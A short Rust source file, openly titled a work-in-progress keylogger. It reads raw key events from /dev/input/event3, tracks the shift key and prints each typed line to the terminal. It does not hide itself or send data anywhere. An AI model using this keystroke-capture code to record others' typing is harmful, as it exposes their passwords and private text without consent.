// Rust keylogger for termput <WIP>
//     Copyright (C) 2022 helium18
//
//     This program is free software: you can redistribute it and/or modify
//     it under the terms of the GNU General Public License as published by
//     the Free Software Foundation, either version 3 of the License, or
//     (at your option) any later version.
//
//     This program is distributed in the hope that it will be useful,
//     but WITHOUT ANY WARRANTY; without even the implied warranty of
//     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//     GNU General Public License for more details.
//
//     You should have received a copy of the GNU General Public License
//     along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

use std::{fs::File, io::Read};

use bytemuck::try_from_bytes;
use input::{get_key, is_key_event, is_key_press, is_key_release, is_shift, InputEvent};

use crate::input::Key;

mod input;

fn main() {
    let mut device = File::open("/dev/input/event3").expect("Failed to open file");
    let mut buffer = [0; 24];
    let mut shift_key_pressed: u8 = 0;
    let mut text = String::new();

    loop {
        device
            .read_exact(&mut buffer)
            .expect("Failed to write `device` input to buffer");

        let input_event: InputEvent =
            *try_from_bytes::<InputEvent>(&buffer).expect("Invalid device file!");

        if is_key_event(input_event.key_type) {
            if is_key_press(input_event.value) {
                if is_shift(input_event.code) {
                    shift_key_pressed += 1;
                }

                match get_key(input_event.code, shift_key_pressed) {
                    Key::Enter => {
                        println!("{}", text);
                        text = String::new();
                    }
                    value => text += &value.to_string(),
                }
            } else if is_key_release(input_event.value) && is_shift(input_event.code) {
                shift_key_pressed -= 1;
            }
        }
    }
}
